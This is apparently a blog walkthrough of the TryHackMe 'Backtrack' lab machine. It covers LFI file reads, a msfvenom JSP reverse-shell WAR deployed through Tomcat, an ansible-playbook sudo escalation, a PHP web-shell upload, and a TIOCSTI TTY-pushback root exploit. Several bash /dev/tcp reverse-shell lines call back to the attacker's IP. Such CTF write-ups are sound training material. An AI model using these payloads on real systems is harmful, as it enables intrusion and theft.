---
title: "backtrack machine"
date: 2024-12-31 00:10:10 +0530
categories: [Tryhackme, Linux Machine]
tags: [ctf]
image: /assets/img/backtrack/profile.png
---

# Introduction

`Backtrack` is the room created by [tryhackme](https://tryhackme.com/p/tryhackme),[0utc4st](https://tryhackme.com/p/0utc4st) and [YoloSaimo](https://tryhackme.com/p/YoloSaimo)


Detailled walkthrough on how i successfully compromised and obtainned user and root flags.
<br>


**LESSON LEARNED IN THIS MACHINE**

>1. Web application Enumeration
>2. Exploiting `Local File inclusion`
>3. Remote files Enumeration via `LFI`
>4. Exploiting apache Tomcat to `RCE`   
>5. User privilege escalation
>8. Exploiting vulnerable Linux binaries
>9. Root privilege escalation through TTY push back

### Methodolgy
1. Enumeration and Scanning 
2. Vulnerability Analysis
3. Penetration testing
4. Gaining initial access
5. User Privilege  escalation - Pivoting attack
6. Root Privilege  escalation
7. Reporting 


#### Enumeration and Scanning

- Testing if `ip` address is reachable

- Ping scan result to test if machine is live

```bash
└─$ ping -c 4 10.10.63.114                                                                   
PING 10.10.63.114 (10.10.63.114) 56(84) bytes of data.
64 bytes from 10.10.63.114: icmp_seq=1 ttl=63 time=250 ms
64 bytes from 10.10.63.114: icmp_seq=2 ttl=63 time=289 ms
64 bytes from 10.10.63.114: icmp_seq=3 ttl=63 time=397 ms
64 bytes from 10.10.63.114: icmp_seq=4 ttl=63 time=318 ms

# -c Specify number of responce to receive to prevent infinity responce loop
```

> Port and Service Scanning using `Nmap, rustscan and masscan`

 - Started with basic Nmap scan

```bash
└─$ nmap -vvv 10.10.63.114 -Pn -oN nmap-scan
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 15:44 EAT
Initiating Parallel DNS resolution of 1 host. at 15:44
Completed Parallel DNS resolution of 1 host. at 15:44, 0.25s elapsed
DNS resolution of 1 IPs took 0.25s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:44
Scanning 10.10.63.114 [1000 ports]
Discovered open port 8888/tcp on 10.10.63.114
Discovered open port 22/tcp on 10.10.63.114
Discovered open port 8080/tcp on 10.10.63.114
Completed SYN Stealth Scan at 15:44, 2.56s elapsed (1000 total ports)
Nmap scan report for 10.10.63.114
Host is up, received user-set (0.19s latency).
Scanned at 2025-01-02 15:44:42 EAT for 2s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
8080/tcp open  http-proxy     syn-ack ttl 63
8888/tcp open  sun-answerbook syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.90 seconds
           Raw packets sent: 1088 (47.872KB) | Rcvd: 1088 (43.532KB)
```

- Rustscan results

```bash
└─$ rustscan -a 10.10.63.114 --ulimit 5000

The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Open 10.10.63.114:22
Open 10.10.63.114:6800
Open 10.10.63.114:8080
Open 10.10.63.114:8888

PORT     STATE SERVICE        REASON
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
6800/tcp open  http            aria2 downloader JSON-RPC
8080/tcp open  http            Apache Tomcat 8.5.93
8888/tcp open  sun-answerbook?
```

- Massscan report

```bash
└─# masscan 10.10.63.114 -p1-65535,U:1-65535 --rate=1000 -e tun0 | tee massscan.port
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-02 12:52:35 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.63.114                                    
Discovered open port 8888/tcp on 10.10.63.114                                  
Discovered open port 6800/tcp on 10.10.63.114                                  
Discovered open port 8080/tcp on 10.10.63.114                                
```  

> Summary of port and service scan results

<div class="overflow-table" markdown="block">

| PORT STATE         | SERVICE VERSION                    |   
| :------------------| :--------------------------------- | 
|  22/tcp open       |  OpenSSH 8.2p1 Ubuntu 4ubuntu0.3   |
|  8080/tcp open     | Apache Tomcat 8.5.93               |    
|  6800/tcp open     | aria2 downloader JSON-RPC          |  
|  8888/tcp open     | Aria2 Version 1.35.0               |    
     
</div>
<br>

- Port 6800
It is default port for aria2 RPC interface. Nothing interesting here.
For more detail visit: https://aria2.github.io/manual/en/html/aria2c.html#rpc-interface

- Port 8888 (aria2 webUI)

 After visiting the site it was clear that it is aria2 webUI. 
 In settings > server info we found version also.

<figure>
<img src="/assets/img/backtrack/port-8888.png" alt="aria2 webUI">
<figcaption>aria2 webUI</figcaption>
</figure>

- Port 8080 (Apache Tomcat)

<figure>
<img src="/assets/img/backtrack/port-8080.png" alt="Apache tomcat">
<figcaption>apache tomcat</figcaption>
</figure>

<br>

#### vulnerability assessment

> Reseach on all versions of services found
- With Google dorks it was found that `Aria2 Version 1.35.0` is vulnerable to `Local file inclusion (LFI)`
- [Link here](https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e)
- Apache tomcat is vulnerable to RCE via malicious jsp upload - all possible with valid credentials
- [Apache tomcat jsp upload vulnerability](https://lists.apache.org/thread/l1qg96ym64x7xf7ncx590070szdtc0wd)
- [Apache tomcat RCE issue](https://community.f5.com/kb/technicalarticles/apache-tomcat-remote-code-execution-via-jsp-upload-cve-2017-12615--cve-2017-1261/283160)



#### Penetration testing

> Testing if our application is vulnerable to `LFI`
> Exploiting Apache tomcat `jsp` upload vulnerability

```bash
└─$ curl --path-as-is http://10.10.63.114:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.....
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:122:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

> Since we can access local files, Tried looking for sensitive files about other sites hosted in the same server, mostly `apache` tomcat configuration files
- Through error message in apache tomcat loggin page we can see the apache tomcat configuration files path.


<figure>
<img src="/assets/img/backtrack/error-tomcat.png" alt="Apache tomcat config path">
<figcaption>apache tomcat config path</figcaption>
</figure>

> Finding the home directory of apache tomcat so as to get user configuration files

- From the `/etc/passwd` file we can conclude that tomcat is installed in `/opt/` directory. So we can obtain username and password of tomcat by making a request on:

```bash
tomcat:x:1002:1002::/opt/tomcat:/bin/false
```

- Checking server Environment variables since we can not access apache server logs files

``` bash
➜  backtrack curl --path-as-is http://10.10.63.114:8888/../../../../../../../../../../../../../../../../../../../../proc/self/environ --output env.txt

➜  backtrack cat environ.txt 
LANG=C.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOME=/opt/tomcatLOGNAME=tomcatUSER=tomcatINVOCATION_ID=b1cd8edef1ff4a1086e31ee2de1eae8eJOURNAL_STREAM=9:20327%  
```

- Research
- [https://docs.boc-group.com/adoit/en/docs/15.0/installation_manual/ins-3300000/](https://docs.boc-group.com/adoit/en/docs/15.0/installation_manual/ins-3300000/)
- [https://www.progress.com/tutorials/jdbc/tomcat](https://www.progress.com/tutorials/jdbc/tomcat)

> Retrieving apache tomcat user configuration file

```bash
➜  backtrack curl --path-as-is http://10.10.63.114:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml 

<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="[REDACTED]" roles="manager-script"/>

</tomcat-users>
```

- since our roles are limited to `roles="manager-script"/`, we can only exploiting malicious jsp upload vulnerability in apache tomcat via `curl`.

- Payload generation with `msfvenom`
```bash
└─$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.21.123.111 lport=4444 -f war -o shell.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: shell.war
```

####  Gaining initial access
- Upload malicious paylod

```bash
└─$ curl -u 'tomcat:[REDACTED]' --upload-file shell.war "http://10.10.63.114:8080/manager/text/deploy?path=/shell&update=true"
OK - Deployed application at context path [/shell]

# visiting:http://10.10.63.114:8080/shell in browser of via curl
```
- Got shell as user tomcat
<figure>
<img src="/assets/img/backtrack/shell-as-tomcat.png" alt="Apache tomcat user shell">
<figcaption>apache tomcat user shell</figcaption>
</figure>

- User Flag
```bash
tomcat@Backtrack:/$ cd ~
tomcat@Backtrack:~$ ls 
BUILDING.txt     NOTICE         RUNNING.txt  flag1.txt  temp
CONTRIBUTING.md  README.md      bin          lib        webapps
LICENSE          RELEASE-NOTES  conf         logs       work
tomcat@Backtrack:~$ pwd
/opt/tomcat
tomcat@Backtrack:~$ cat flag1.txt
THM{[REDACTED]}
tomcat@Backtrack:~$ 
tomcat@Backtrack:~$ 
```

#### User Privilege  escalation - Pivoting attack

- Checking curret Privilege  of user with `sudo -l`

```bash
tomcat@Backtrack:~$ ls -la /home/
total 16
drwxr-xr-x  4 root    root    4096 Mar  9  2024 .
drwxr-xr-x 20 root    root    4096 Mar 13  2024 ..
drwxrwx---  2 orville orville 4096 Jan  2 14:47 orville
drwxrwx---  2 wilbur  wilbur  4096 Mar  9  2024 wilbur
tomcat@Backtrack:~$ sudo -l
Matching Defaults entries for tomcat on Backtrack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on Backtrack:
    (wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml
tomcat@Backtrack:~$ 
```
- User `tomcat` can run ansible-playbook as wilbur without password. Then through [Ansible playbook privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/ansible-playbook-privilege-escalation/), Created usefully payload.

```console
# /tmp/priv.yml
- hosts: localhost
  tasks:
    - name: RShell
      command: bash /tmp/a.sh

# /tmp/a.sh contents
bash -c 'exec bash -i &>/dev/tcp/10.21.123.111/4445 <&1'
```

- Shell as user wilbur

```bash
tomcat@Backtrack:/tmp$ sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/a.yml

packages/ansible/plugins/callback/splunk.py) as it seems to be invalid: module
'lib' has no attribute 'X509_V_FLAG_NOTIFY_POLICY'
.........
PLAY [localhost] ***************************************************************

TASK [Gathering Facts] *********************************************************
ok: [localhost]

TASK [RShell] ******************************************************************
```

<figure>
<img src="/assets/img/backtrack/user-wilbur.png" alt="wilbur user shell">
<figcaption>wilbur user shell</figcaption>
</figure>


- User profile with usable files

```bash
wilbur@Backtrack:/tmp$ cd ~    
wilbur@Backtrack:~$ ls -la
drwxrwx--- 3 wilbur wilbur 4096 Jan  7 06:41 .
drwxr-xr-x 4 root   root   4096 Mar  9  2024 ..
drwxrwxr-x 3 wilbur wilbur 4096 Jan  7 06:41 .ansible
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 3771 Mar  9  2024 .bashrc
-rw------- 1 wilbur wilbur   48 Mar  9  2024 .just_in_case.txt
lrwxrwxrwx 1 root   root      9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 wilbur wilbur 1010 Mar  9  2024 .profile
-rw------- 1 wilbur wilbur  461 Mar  9  2024 from_orville.txt
wilbur@Backtrack:~$ cat from_orville.txt    
cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : [REDACTED]
wilbur@Backtrack:~$ cat .just_in_case.txt
cat .just_in_case.txt
in case i forget :

wilbur:[REDACTED]
wilbur@Backtrack:~$ 
```

- Seems they were developing some web app, let's check running services in TCP/IP of the system
<figure>
<img src="/assets/img/backtrack/active-ports-linpease.png" alt="active local ports">
<figcaption>active local ports</figcaption>
</figure>

- SSH port Forwading so that local port in target can be accessible to our machine.

```bash
└─$ ssh -L 80:127.0.0.1:80 wilbur@10.10.63.114
The authenticity of host '10.10.63.114 (10.10.63.114)' can't be established.
ED25519 key fingerprint is SHA256:0083wvLGeoh6f0CIO11O0TYxt6R1Hr7AB8xEhvgtm+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.63.114' (ED25519) to the list of known hosts.
wilbur@10.10.63.114's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-173-generic x86_64)
...............

-Xmx1024M: command not found
wilbur@Backtrack:~$ 
```

- Accessing web app via [http://127.0.0.1:80/](http://127.0.0.1:80/)

<figure>
<img src="/assets/img/backtrack/port-80.png" alt="port 80">
<figcaption>port 80</figcaption>
</figure>

- uploaded malicious `php` file by bypassing file extention checks like, `file.jpg.php`.
- Also the file should be uploaded in diffrent directory rather than `/uploads` b'cz we can not execute it in there. done by double encodeing `../`.
<figure>
<img src="/assets/img/backtrack/shell-upload.png-" alt="port 80 shell upload">
<figcaption>port 80 shell upload</figcaption>
</figure>

- Shell as user olivile

```bash
curl http://127.0.0.1:80/file.jpg.php?cmd="bash -c 'exec bash -i &>/dev/tcp/10.21.123.111/4445 <&1'"
```

- listen on port 

```bash
└─# nc -nlvp 4445                                                                                                     
listening on [any] 4445 ...
connect to [10.21.123.111] from (UNKNOWN) [10.10.63.114] 54252
bash: cannot set terminal process group (540): Inappropriate ioctl for device
bash: no job control in this shell
orville@Backtrack:/var/www/html$ 
orville@Backtrack:/var/www/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<tml$ python3 -c 'import pty;pty.spawn("/bin/bash")'
orville@Backtrack:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 4445

orville@Backtrack:/var/www/html$ cd /home/orville ; ls -la
drwxrwx--- 2 orville orville   4096 Jan  7 06:57 .
drwxr-xr-x 4 root    root      4096 Mar  9  2024 ..
lrwxrwxrwx 1 root    root         9 Mar  9  2024 .bash_history -> /dev/null
-rw-r--r-- 1 orville orville   3771 Mar  9  2024 .bashrc
lrwxrwxrwx 1 root    root         9 Mar  9  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 orville orville    807 Mar  9  2024 .profile
-rw------- 1 orville orville     38 Mar  9  2024 flag2.txt
-rwx------ 1 orville orville 112448 Jan  7 06:57 web_snapshot.zip
orville@Backtrack:/home/orville$ cat flag2.txt
cat flag2.txt
THM{[REDACTED]}
orville@Backtrack:/home/orville$ 
```

#### Root Privilege  escalation

- Uploaded linpease in the target machine to check any missconfigurations no luck.
- Using process spy tool `pspy64`

```bash
# Source: https://github.com/DominicBreuker/pspy/releases
orville@Backtrack:/home/orville$ wget <YOUR MACHINE IP>:8000/pspy64
orville@Backtrack:/home/orville$ chmod +x pspy64
orville@Backtrack:/home/orville$ ./pspy64
```

- Running it in the target machine and found something interesting.
- We noticed that root had used a command `su - orville` to switch users, but the root shell was still running in the background. 

> `su -` command
When root switched to Orville using this commnad `su — orville`, it created a new shell for orville. The `-` in the command basically acts like a full login for Orville.
> By using an old trick of instead of closing entire session, we can send sigstop signal, and paused the orville shell and switched control back to the root shell, which was still running behind the scenes.
[TTY pushback attack - more understanding](https://www.errno.fr/TTYPushback.html).

- Creating exploit python script

```console
# eploit.py
#!/usr/bin/env python3
import fcntl
import termios
import os
import sys
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in sys.argv[1] + '\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

- Then 

```bash
echo "python3 /tmp/eploit.py \"bash -c 'bash -i >& /dev/tcp/10.21.123.111/4446 0>&1'\"" >> ~/.bashrc
```

- Listening in other terminal for some time

<figure>
<img src="/assets/img/backtrack/root.png" alt="root-shell">
<figcaption>root-shell</figcaption>
</figure>

 <figure>
<img src="/assets/img/ohmywebserver/finished-finally-finished.gif" alt="finished-finally-finished">
<figcaption></figcaption>
</figure>

<br>